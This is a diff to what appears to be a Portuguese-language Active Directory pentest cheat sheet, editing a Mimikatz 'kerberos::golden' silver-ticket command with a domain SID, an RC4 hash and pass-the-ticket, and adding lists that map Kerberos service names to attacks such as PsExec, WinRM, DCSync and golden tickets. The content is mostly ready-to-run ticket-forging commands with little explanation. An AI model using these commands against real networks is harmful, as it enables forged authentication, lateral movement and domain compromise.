@@ -1363,8 +1363,27 @@ lsadump::lsa /patch
 ```
 ##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL):
 ```
-kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:CIFS /rc4:aaaaa /user:administrator /ptt
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01 /service:cifs /rc4:6d979159a6647db4b1df73dd3e70f36b /user:administrator /ptt
 ```
+SERVIÇOS:
+- HOST, RPCSS - for WMI interactions
+- HOST for Schtasks
+- LDAP for LDAP including DCsync attack
+- HOST, HTTP for WinRM
+- HOST, HTTP, WSMAN, RPCSS - for PowerShell Remoting
+
+SERVIÇOS:
+- WMI INTERACTIONS - HOST, RPCSS
+- POWERSHELL REMOTING - HOST, HTTP, WSMAN, RPCSS     DEPENDE: WSMAN,RPCSS
+- WINRM - HOST,HTTP *** EM ALGUNS CASOIS PODE PEDIR SOMENTE WINRM
+- SCHEDULED TASKS - HOST
+- WINDOWS FILE SHARE  - CIFS
+- PSEXEC - CIFS
+- LDAP OPERATIONS - LDAP
+- LDAP DCSYNC - LDAP
+- WINDOWS REMOTE SERVER ADMINISTRAION TOOLS - RPCSS, LDAP, CIFS
+- GOLDEN TICKET - krbtgt
  
 
 
